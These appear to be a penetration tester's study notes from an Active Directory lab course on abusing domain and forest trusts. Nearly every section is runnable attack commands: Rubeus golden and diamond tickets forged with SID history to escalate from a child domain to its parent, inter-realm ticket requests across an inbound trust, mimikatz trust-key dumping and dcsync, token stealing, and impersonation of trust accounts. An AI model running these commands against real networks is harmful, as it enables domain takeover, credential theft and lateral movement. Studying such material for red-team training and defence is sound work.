# Forest and Domain Trusts Notes

child domains are added to forests with a transitive, two-way trusts with its parent

list trust
```
powershell Get_DomainTrust
```

things to look at:
- Sourcename - current domain
- Targetname - foreign domain
- TrustDirection - trust direction applied
- TrustAttributes - can tell us if both domains are in a forest. WITHIN_FOREST can indicate a child/parent relationship

DA privs in the child means DA privs in the parent using a TGT with the SID History attribute

## Golden Ticket with SID History

need target groups SID
```
powershell Get-DomainGroup -Identity "Domain Admins" -Domain <parent domain> -Properties ObjectSid
```

create golden ticket
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<krbtgt hash> /user:Administrator /domain:<child domain> /sid:<child domains sid> /sids:<target groups SID> /nowrap
```

import
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:Administrator /password:FakePass /ticket:<base64>
steal_token <PID>
```

now we can interact with the parent domains stuff
```
ls \\<parent domains dc>\c$
```

## Diamond Ticket with SID History

the diamond flag let's use specify additional sids to add

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:<target groups sid> /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
```

## One-Way Inbound

if you have an Inbound trust in the TrustDirection from below
```
powershell Get-DomainTrust
```

it means that principals in our domain can be granted access to resources in the foreign domain
enum across
```
powershell Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName
```

enum any groups with users outside of our domain and return the members, use second command to convert the SID
```
powershell Get-DomainForeignGroupMember -Domain <other domain with inbound trust with>
powershell ConvertFrom-SID <SID>
```

in this example we hop the trust we need to impersonate one of members part of the built-in administrators group 
setps:
1. find the users of this group
2. obtain a TGT for the target user
3. use TGT to req a referral ticket
4. use this inter-realm ticket to req TGS's in the target domain
```
powershell Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<user> /domain:<current domain> /aes256:<user hash> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/<target domain> /domain:<current domain> /dc:<current domain dc> /ticket:<base64> /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/<target domain dc> /domain:<target domain> /dc:<target dc> /ticket:<base64> /nowrap
```

## One-Way Outbound

this means the other domain has trust in the current domain, but not the other way around
```
powershell Get-DomainTrust -Domain <domain>
```

can partially exploit this and obtain "domain user" access to this other domain by leveraging a shared credential for the trust. We are looking for a Trusted Domain Object (TDO). 
enum for TDO's
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection
```

two ways to abuse, move laterally ot the DC and dump from memory
```
mimikatz lsadump::trust /patch
```

or dcsync with the TDOs GUID
```
powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{<guid from above>}
```

there is also a trust account that exists with the name of the trusting domain, we'll see this in this enumeration
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"
```

this means the target domain will have a trust account named our domain$, this is the account we must impersonate
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<domain>$ /domain:<target domain> /rc4:<rc4 of password from dcsync> /nowrap
import:
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<current domain> /username:domain$ /password:FakePass /ticket:<base64>
steal_token <PID>
powershell Get-Domain -Domain <target domain>
```

